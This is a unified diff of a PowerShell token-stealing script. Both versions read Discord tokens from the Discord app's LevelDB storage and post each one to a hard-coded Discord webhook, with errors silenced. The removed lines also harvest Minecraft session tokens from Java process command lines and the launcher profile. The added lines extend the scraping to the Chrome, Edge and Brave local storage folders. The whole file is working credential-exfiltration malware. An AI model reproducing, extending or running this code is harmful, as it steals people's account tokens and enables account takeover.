@@ -1,57 +1,43 @@
-$webhookUrl = "https://discord.com/api/webhooks/1490629749159104532/wFu6BV4lrg8HHuNzi10Ii4pMXYkJx0_xDuk5NnOgVDoPvJqwAoPsesebgGKOIm2WZ6Oc"
+$webhookUrl = "https://discord.com/api/webhooks/1471525038896316609/gdxKnjCycJyrNZQ6QSQ2nNvgDarhtqzv3czPdWShYVyFdUji-4jwS_0axnvNJPO9NShh"
 
-# Discord tokens from app storage
-$paths = @(
+# Discord app tokens
+$appPaths = @(
     "$env:LOCALAPPDATA\Discord\Local Storage\leveldb",
     "$env:LOCALAPPDATA\discordcanary\Local Storage\leveldb",
     "$env:LOCALAPPDATA\discordptb\Local Storage\leveldb"
 )
 
-foreach ($path in $paths) {
+foreach ($path in $appPaths) {
     if (Test-Path $path) {
         Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
             $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
             $matches = [regex]::Matches($content, '[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}')
             foreach ($match in $matches) {
-                $payload = @{ content = "**[DISCORD TOKEN]**`n```$($match.Value)```" } | ConvertTo-Json
-                try {
-                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
-                } catch {}
-                Start-Sleep -Milliseconds 500
+                $payload = @{ content = "**[DISCORD APP TOKEN]**`n```$($match.Value)```" } | ConvertTo-Json
+                try { Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue } catch {}
+                Start-Sleep -Milliseconds 300
             }
         }
     }
 }
 
-# Java process tokens (Minecraft modded clients)
-Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name='java.exe'" -ErrorAction SilentlyContinue |
-    Select-Object -ExpandProperty CommandLine |
-    ForEach-Object {
-        if ($_ -match '--accessToken\s+(\S+)') {
-            $accessToken = $matches[1]
-            $username = ""
-            if ($_ -match '--username\s+(\S+)') {
-                $username = $matches[1]
-            }
-            if ($accessToken) {
-                $payload = @{ content = "**[JAVA TOKEN - $username]**`n```$accessToken```" } | ConvertTo-Json
-                try {
-                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
-                } catch {}
-                Start-Sleep -Milliseconds 500
+# Browser Discord tokens (Chrome, Edge, Brave)
+$browserPaths = @(
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
+    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"
+)
+
+foreach ($path in $browserPaths) {
+    if (Test-Path $path) {
+        Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
+            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
+            $matches = [regex]::Matches($content, '[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}')
+            foreach ($match in $matches) {
+                $payload = @{ content = "**[DISCORD BROWSER TOKEN]**`n```$($match.Value)```" } | ConvertTo-Json
+                try { Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue } catch {}
+                Start-Sleep -Milliseconds 300
             }
         }
     }
-
-# Minecraft launcher token
-$mcPath = "C:\Users\$env:USERNAME\AppData\Roaming\.minecraft\launcher_profiles.json"
-if (Test-Path $mcPath) {
-    try {
-        $data = Get-Content $mcPath -Raw | ConvertFrom-Json
-        $token = $data.accessToken
-        if ($token) {
-            $payload = @{ content = "**[MINECRAFT SESSION]**`n```$token```" } | ConvertTo-Json
-            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
-        }
-    } catch {}
 }
